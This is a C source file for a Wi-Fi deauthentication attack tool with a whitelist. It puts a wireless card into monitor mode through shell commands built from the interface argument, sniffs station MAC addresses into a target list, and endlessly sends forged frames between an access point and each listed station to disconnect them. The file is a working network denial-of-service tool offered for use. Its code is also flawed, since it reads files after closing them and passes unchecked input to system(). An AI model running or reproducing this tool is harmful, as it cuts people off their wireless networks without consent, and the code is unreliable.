#include <pthread.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "beacon.cpp"
#define NULL 0x00
#define MAC_ALEN 6
#define MAC_ADDR_STR_LEN 17

void usage(){
    printf("syntax: deauth-attack-whitelist <interface> <ap mac> <station_mac_list> <white_list>\n");
    printf("sample: deauth-attack-whitelist wlan0 AA:BB:CC:DD:EE:FF station_mac.txt white_list.txt  \n");
}

void monitor(char * dev){ // 랜카드 모니터 모드로 변경 함수
    char command[100];
    sprintf(command, "ifconfig %s down",dev);
    system(command);
    sprintf(command, "iwconfig %s mode monitor",dev);
    system(command);
    sprintf(command, "ifconfig %s up",dev);
    system(command);
}

bool ConvertMacAddrStr2Array(const char *mac_addr_str, uint8_t mac_addr[MAC_ALEN]){
    int res, i ,val;
    char temp[MAC_ADDR_STR_LEN+1];
    if(strlen(mac_addr_str) != MAC_ADDR_STR_LEN) return true;
    memcpy(temp, mac_addr_str, MAC_ADDR_STR_LEN);
    temp[MAC_ADDR_STR_LEN] = 0x00;
    for(i = 0; i < MAC_ALEN; i++){
        temp[(3*i)+2] = '\0';
        res = sscanf((const char *)&temp[3*i], "%x", &val);
        if(res==0) return true;
        mac_addr[i] = (char)val;
    }
    return false;
}

int set_bssid(FILE* pFile, char * bssid){
    char strTemp[20]= {0,};
    if(!feof(pFile)) fgets(strTemp, sizeof(strTemp),pFile);
    else fseek(pFile,0,SEEK_SET);
    if (strlen(strTemp) == 0){
        fseek(pFile,0,SEEK_SET);
        return -1;
    }
    if (strTemp[strlen(strTemp)-1] == 0x0d) strTemp[strlen(strTemp)-1] = 0x00;
    if (strTemp[strlen(strTemp)-1] == 0x0a) strTemp[strlen(strTemp)-1] = 0x00;
    memcpy(bssid, strTemp, 20);
    return 0;
}

int check_mac_list(FILE* pFile, char *mac){
    char strTemp[20] = {0,};
    while(!feof(pFile)){
        fgets(strTemp, sizeof(strTemp),pFile);
        if(strcmp(mac, strTemp)==0){
            return 1;
        }
    }
    return 0;
}


void *station_mac(void *arg) {
    struct multiargs *data = (struct multiargs *)arg;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap2 = pcap_open_live((char *)data->dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap2 == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", (char *)data->dev, errbuf);
        exit(0);
    }
    while (1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        unsigned int radiotap_len;
        unsigned char *smac = NULL;

        int res = pcap_next_ex(pcap2, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap2));
            break;
        }
        radiotap_len = radiotap_length((struct radiotap_header *)packet);
        packet += radiotap_len;
        smac = dump_beacon_header((struct IEEE_802dot11 *)packet);
        if (smac == NULL) continue;

        char mac[20] = {0,};
        int flag =0;

        sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x\n",smac[0], smac[1], smac[2], smac[3], smac[4], smac[5]);
        //printf("mac : %s\n",mac);
        FILE* pFile = fopen((char *)data->station_mac_list, "rb");
        if (pFile == NULL){
            printf("File(station_mac_list) not Found (thread2)\n");
            exit(0);
        }
        fclose(pFile);
        flag = check_mac_list(pFile, mac);
        FILE* pFile3 = fopen((char *)data->white_list, "rb");
        if (pFile3 == NULL){
            printf("File(white_list) not Found (thread2)\n");
            exit(0);
        }
        fclose(pFile3);
        flag = check_mac_list(pFile3, mac);

        if(flag == 0){
            FILE* pFile2 = fopen((char *)data->station_mac_list, "ab");
            if (pFile2 == NULL){
                printf("File(station_mac_list) not Found (thread2)\n");
                exit(0);
            }
            //printf("ADD MAC ADDR : %s\n", mac);
            if(fputs(mac, pFile2) != EOF) fseek(pFile,0,SEEK_SET);
            fclose(pFile2);
        }
        usleep(10);
    }
    pcap_close(pcap2);
    printf("Thread 2 Die!!\n");
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        usage();
        return 0;
    }
    if(strlen(argv[1])>30){
        printf("interface name length less than 30 characters");
        return -1;
    }

    char * dev = argv[1];
    char * ap_mac = argv[2];
    char * station_list = argv[3];

    struct multiargs multiarg;
    multiarg.dev = argv[1];
    multiarg.station_mac_list = argv[3];
    multiarg.white_list = argv[4];

    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t macAddr[MAC_ALEN];
    int num=0;
   
    monitor(dev);
    pthread_t thread;
    pthread_create(&thread, 0, station_mac, (void *)&multiarg);
    pcap_t* pcap = pcap_open_live(dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    FILE* pFile = fopen(station_list, "rb");
    if (pFile == NULL){
        printf("File not Found!\n");
        exit(0);
    }

    //비콘 프레임 생성/초기화
    struct beacon_frame beacon_a2s;
    struct beacon_frame beacon_s2a;

    if (ConvertMacAddrStr2Array(ap_mac, macAddr)){
        printf("Fail to convert MAC address 1\n");
        return -1;
    }
    memcpy(beacon_a2s.becon.shost, macAddr, 6);
    memcpy(beacon_a2s.becon.bssid, macAddr, 6);
    memcpy(beacon_s2a.becon.dhost, macAddr, 6);

    while (1) {
        char bssid[20]= {0,};
        if (set_bssid(pFile, bssid) == -1) continue;

        if (ConvertMacAddrStr2Array(bssid, macAddr)){
            printf("Fail to convert MAC address 2\n");
            return -1;
        }
        memcpy(beacon_a2s.becon.dhost, macAddr, 6);
        memcpy(beacon_s2a.becon.shost, macAddr, 6);
        memcpy(beacon_s2a.becon.bssid, macAddr, 6);


        if (pcap_sendpacket(pcap, (unsigned char*)&beacon_a2s, sizeof(beacon_a2s)) != 0){
            printf("Fail sendpacket 1\n");
            exit (-1);
        }
        usleep(10);

        if (pcap_sendpacket(pcap, (unsigned char*)&beacon_s2a, sizeof(beacon_s2a)) != 0){
            printf("Fail sendpacket 2\n");
            exit (-1);
        }
        printf("%5d | [AP] %s <-> [station] %02x:%02x:%02x:%02x:%02x:%02x | Deauth Packet!\n",++num, ap_mac, beacon_s2a.becon.bssid[0],beacon_s2a.becon.bssid[1],beacon_s2a.becon.bssid[2]
                                                                                                              ,beacon_s2a.becon.bssid[3],beacon_s2a.becon.bssid[4],beacon_s2a.becon.bssid[5]);
        usleep(1000);
    }
    fclose(pFile);
    pcap_close(pcap);
}
